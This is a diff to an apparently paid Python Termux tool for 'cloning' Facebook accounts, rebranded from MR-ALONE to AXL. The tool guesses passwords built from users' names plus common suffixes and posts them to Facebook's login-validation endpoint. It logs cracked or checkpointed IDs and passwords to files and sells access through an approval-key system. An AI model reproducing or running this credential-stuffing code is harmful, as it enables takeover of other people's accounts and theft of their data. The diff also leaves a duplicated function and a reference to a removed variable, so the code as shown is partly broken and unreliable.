@@ -28,7 +28,11 @@ os.system("pkg install espeak")
 print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
 os.system("espeak -a 300 \"Checking,Update,\"")
 time.sleep(2)
-os.system('clear')
+#os.system('clear')
+print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 6.1...! ')
+os.system("espeak -a 300 \"UPDATE VERSION 6.1,\"")
+time.sleep(2)
+#os.system('clear')
 ##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
 #------------------[ MR-ALONE ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
@@ -1606,7 +1610,7 @@ tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 date = str(tgl)+'/'+str(bln)+'/'+str(thn)
 ltx = int(lt()[3])
 if ltx > 12:
@@ -1639,27 +1643,34 @@ def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 os.system('xdg-open https://www.facebook.com/profile.php?id=100088035424278')
 logo ="""
- ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
- ║\033[0;96m●▬▬▬▬▬๑🌸🕌۩[Bismillahir Rahmanir Rahim]۩🕌🌸๑▬▬▬▬▬▬●\033[0;91m║
- ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-        \33[0;91m █████╗ ██╗      ██████╗ ███╗   ██╗███████╗    
-        \33[0;91m██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝
-        \33[0;91m███████║██║     ██║   ██║██╔██╗ ██║█████╗      
-        \33[0;91m██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝      
-        \33[0;91m██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗    
-        \33[0;91m╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝      
- ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
- ║\33[0;95m[<🕌Assalamualaikum"Mind It,'You Will Never Alone🕴️>]\033[0;95m║
- ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\033[1;31m==================================================
-=================================================="\033[1;23m"""                                
-balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
-meyermarexudi =(""" \033[0;97m=============================================""")    
-alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
-xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
-fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
-xudinaministar =(""" \033[38;1m[-] Importent Note """)
-hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)
+
+\033[0;92m          
+\033[0;92m           ▄▄▄      ▒██   ██▒ ██▓    
+\033[0;92m          ▒████▄    ▒▒ █ █ ▒░▓██▒    
+\033[0;92m          ▒██  ▀█▄  ░░  █   ░▒██░    
+\033[0;92m          ░██▄▄▄▄██  ░ █ █ ▒ ▒██░    
+\033[0;92m           ▓█   ▓██▒▒██▒ ▒██▒░██████▒
+\033[0;92m           ▒▒   ▓▒█░▒▒ ░ ░▓ ░░ ▒░▓  ░
+\033[0;92m            ▒   ▒▒ ░░░   ░▒ ░░ ░ ▒  ░
+\033[0;92m            ░   ▒    ░    ░    ░ ░   
+\033[0;92m                ░  ░ ░    ░      ░  ░
+                     
+\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
+╠══[Author                   • \33[1;38mAXL       ║\033[1;31m 
+╠══[Facebook                 • AXL CHAN           ║  \033[1;97m  
+╠══[Github                   • \33[1;38mSECRET    ║\33[1;34m   
+╠══[Whatsapp                 • 01*********        ║\33[1;35m 
+╠══[TOOLS                    • Paid               ║ \33[1;32m   
+╠══[VERSION                  • 1.2]               ║\033[1;35m 
+\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
+balpakna = (
+    """\x1b[38;5;50m══════════════════════════════════════════════════""")
+meyermarexudi = (
+    """ \033[0;97m=============================================""")
+approved = (""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
+os.system('clear')
+hedaborakarent = (""" \033[35;1m[𝟸] Enjoy Cracking😎 """)
+os.system('clear')
 
                   #____APPROVAL SYSTEM ADD_____#
 def meyexudi():
@@ -1668,8 +1679,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get(
-        'https://github.com/secre159/approval/blob/main/approved.txt').text
+    httpCaht = requests.get('https://github.com/secre159/approval/blob/main/approved.txt').text
     if id in httpCaht:
       print(fuckyoursali)
       print(hedaborakarent)
@@ -1678,6 +1688,15 @@ def meyexudi():
       print()
       pass
     else:
+      print(meyermarexudi)
+     # print(" \033[32;1m[+] Your Kay : "+id)
+      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
+      print(' \x1b[1;98m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
+      print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
+      print(' \x1b[1;97m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
+      print(' \x1b[1;95m║══[𝟸]💥  15 DAY 250 TAKA ')
+      print(' \x1b[38;5;50m║══[𝟸]💥  30 DAY 500 TAKA ')
+      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   ALONE,    Please,   Send,   Your,   Key,"')
       print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
       input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
       tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801309177411?text='+tks),approval()      
@@ -1690,11 +1709,61 @@ meyexudi()
 def naima():
 	print('-------------------')
 print(logo)
+os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
 uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
+os.system('espeak -a 300 " Welcome,   to,  MR.ALONE,  PAID,   Tools"')
+
+
+def meyexudi():
+    os.system('clear')
+    print(logo)
+    uuid = str(os.geteuid()) + str(os.getlogin())
+    id = "-".join(uuid)
+    try:
+        httpCaht = requests.get(
+            'https://github.com/secre159/approval/blob/main/approved.txt').text
+        if id in httpCaht:
+            print(approved)
+            print(hedaborakarent)
+            msg = str(os.geteuid())
+            # time.sleep(0.5)
+            print()
+            pass
+        else:
+            print(meyermarexudi)
+           # print(" \033[32;1m[+] Your Kay : "+id)
+            os.system(
+                'espeak -a 300 " Hello,   Sir,   I,   Am,    Robot,   of,  AXL,    Please,   Send,   Your,   Key,"')
+            print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
+            input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
+            tks = (
+                'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id)
+            os.system('am start https://m.me/axczel.xhan?text='+tks), approval()
+            time.sleep(1)
+            meyexudi()
+    except:
+        sys.exit()
+
+
+meyexudi()
+# os.system("python AXL.py")
+
+
+def naima():
+    print('-------------------')
+
+
+print(logo)
+os.system('espeak -a 300 " Please,   Enter,   Your,   Real,   Name,   Sir,"')
+uname = input(
+    '\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
+os.system('espeak -a 300 " Welcome,   to,  AXL,BRO,  PAID,   Tools"')
+
 def back():
 	login()
 	
 	import getpass
+ 
  
 def login():
     try:
@@ -1750,7 +1819,7 @@ def login_lagi334():
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
-        os.system("python a.py")
+        os.system("python b.py")
         exit()
 
 #------------------[ MENU ]----------------#
@@ -1764,6 +1833,14 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
+    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
+    print('\033[0;97m===============================================')
+    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
+    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
+    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
+    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
+    print('\033[0;97m=================')
     HEART = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
     if HEART in ['111']:
         login()
@@ -1771,7 +1848,8 @@ def menu():
     elif HEART in ['1']:
         crack_file()
     elif HEART in ['2','02']:
-        os.system("python a.py")
+        os.system('xdg-open https://github.com/Mr-Alon')
+        os.system("python b.py")
     elif HEART in ['3','03']:
         result()
     elif HEART in ['0']:
@@ -2053,6 +2131,10 @@ def passwrd():
                     pwv.append(frs+'123'),
                     pwv.append(frs+'1234'),
                     pwv.append(frs+'12345'),
+                    pwv.append(frs+'123456'),
+                    pwv.append(frs+'1234567'),
+                    pwv.append(frs+'12345678'),
+                    pwv.append(frs+'123456789'),
                     pwv.append(frs+'10'),
                     pwv.append(frs+'11'),
                     pwv.append(frs+'12'),
@@ -2072,7 +2154,42 @@ def passwrd():
                     pwv.append(frs+'ganda')
                     pwv.append(frs+'pogi')
                     pwv.append(frs+'cute')
-                                      
+
+            else:
+                if len(frs) < 3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(last+frs)
+                    pwv.append(last+'1'),
+                    pwv.append(last+'12'),
+                    pwv.append(last+'123'),
+                    pwv.append(last+'1234'),
+                    pwv.append(last+'12345'),
+                    pwv.append(last+'123456'),
+                    pwv.append(last+'1234567'),
+                    pwv.append(last+'12345678'),
+                    pwv.append(last+'123456789'),
+                    pwv.append(last+'10'),
+                    pwv.append(last+'11'),
+                    pwv.append(last+'12'),
+                    pwv.append(last+'13'),
+                    pwv.append(last+'14'),
+                    pwv.append(last+'15'),
+                    pwv.append(last+'16'),
+                    pwv.append(last+'17'),
+                    pwv.append(last+'18')
+                    pwv.append(last+'19')
+                    pwv.append(last+'20')
+                    pwv.append(last+'143')
+                    pwv.append(nmf)
+                    pwv.append(last+'gwapo')
+                    pwv.append(last+'gandako')
+                    pwv.append(last+'maganda')
+                    pwv.append(last+'ganda')
+                    pwv.append(last+'pogi')
+                    pwv.append(last+'cute')
+                    
+                    
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -2093,7 +2210,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m===================================')
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python a.py")
+    os.system("python b.py")
     exit() 
 #--------------------[ METODE-B-API ]-----------------#
  
@@ -2118,7 +2235,7 @@ def crack(idf,pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[ALONE-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
-                os.system('espeak -a 300 " CHECKPOINT"')
+                os.system('espeak -a 300 "DEAD"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -2160,7 +2277,7 @@ def crackfree(idf,pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ALONE-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                os.system('espeak -a 300 "CHECKPOINT"')
+                os.system('espeak -a 300 "DEAD"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
